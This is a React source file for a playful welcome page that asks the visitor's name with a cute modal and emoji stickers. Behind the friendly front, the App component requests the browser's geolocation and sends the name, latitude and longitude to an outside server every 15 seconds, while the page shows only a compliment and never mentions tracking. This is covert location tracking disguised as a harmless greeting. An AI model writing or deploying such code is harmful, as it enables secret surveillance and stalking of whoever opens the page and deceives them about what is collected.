import React, { useState, useEffect } from "react";
import axios from "axios";

// Simple Modal component with mobile responsiveness
const Modal = ({ isOpen, onSubmit }) => {
  const [name, setName] = useState("");

  const handleInputChange = (e) => {
    const value = e.target.value.trim();
    setName(value);
  };

  const handleSubmit = () => {
    if (name) {
      onSubmit(name); // Pass the name to parent component
    }
  };

  return (
    isOpen && (
      <div style={modalStyles}>
        <h2 style={headerStyles}>🌟 Welcome! 🌟</h2>
        <p style={subTextStyles}>Please enter your name below</p>
        <input 
          type="text" 
          value={name} 
          onChange={handleInputChange} 
          placeholder="Hey Cute Person, enter your Name!"
          style={inputStyles} 
        />
        <button onClick={handleSubmit} disabled={!name} style={buttonStyles}>
          Submit
        </button>
        <div style={stickerContainer}>
          <span>🎉</span><span>💖</span><span>✨</span><span>🌈</span>
        </div>
      </div>
    )
  );
};

// Main Component
const App = () => {
  const [name, setName] = useState(null);

  // Function to send geolocation + name to server
  const sendLocationToServer = (name) => {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition((position) => {
        const { latitude, longitude } = position.coords;

        axios.post("https://backend-loc.onrender.com/location", { name, latitude, longitude })
          .then(response => console.log("Data sent:", response))
          .catch(error => console.error("Error sending location:", error));
      });
    } else {
      console.error("Geolocation not supported");
    }
  };

  // Effect to trigger location sending every 15 seconds
  useEffect(() => {
    if (name) {
      sendLocationToServer(name); // Initial call

      const interval = setInterval(() => {
        sendLocationToServer(name);
      }, 15000); // Every 15 seconds

      return () => clearInterval(interval); // Cleanup on unmount
    }
  }, [name]);

  return (
    <div style={appContainer}>
      <Modal isOpen={!name} onSubmit={(userName) => setName(userName)} />
      {name && <div style={trackingText}>Just a reminder, {name} is a good Person</div>}
    </div>
  );
};

// Updated styles for the modal and stickers with mobile responsiveness
const modalStyles = {
  position: "fixed",
  top: "50%",
  left: "50%",
  transform: "translate(-50%, -50%)",
  background: "linear-gradient(135deg, #ff9a9e 0%, #fad0c4 100%)",
  padding: "30px",
  borderRadius: "15px",
  boxShadow: "0 5px 15px rgba(0, 0, 0, 0.2)",
  textAlign: "center",
  maxWidth: "400px",
  width: "100%",
  zIndex: 1000,
};

const headerStyles = {
  fontSize: "24px",
  marginBottom: "10px",
  color: "#333",
};

const subTextStyles = {
  fontSize: "16px",
  marginBottom: "20px",
  color: "#555",
};

const inputStyles = {
  width: "100%",
  padding: "10px",
  borderRadius: "8px",
  border: "1px solid #ccc",
  marginBottom: "20px",
  fontSize: "16px",
  boxShadow: "inset 0 2px 5px rgba(0,0,0,0.1)",
};

const buttonStyles = {
  backgroundColor: "#ff758c",
  border: "none",
  padding: "10px 20px",
  borderRadius: "8px",
  color: "white",
  cursor: "pointer",
  fontSize: "16px",
  boxShadow: "0 4px 10px rgba(0, 0, 0, 0.2)",
  transition: "background-color 0.3s",
};

const stickerContainer = {
  display: "flex",
  justifyContent: "space-around",
  marginTop: "15px",
  fontSize: "24px",
};

const appContainer = {
  fontFamily: "'Poppins', sans-serif",
  padding: "50px",
  background: "#f7f7f7",
  minHeight: "100vh",
  display: "flex",
  justifyContent: "center",
  alignItems: "center",
};

const trackingText = {
  fontSize: "20px",
  color: "#333",
  marginTop: "20px",
};

// Add media queries for mobile responsiveness
const mobileModalStyles = `
@media (max-width: 768px) {
  .modalStyles {
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    padding: 20px;
    border-radius: 0;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    background: linear-gradient(135deg, #ff9a9e 0%, #fad0c4 100%);
    z-index: 1000;
  }

  .inputStyles {
    font-size: 14px;
    padding: 10px;
  }

  .buttonStyles {
    font-size: 14px;
    padding: 10px 20px;
  }

  .stickerContainer {
    font-size: 20px;
  }
}
`;

export default App;
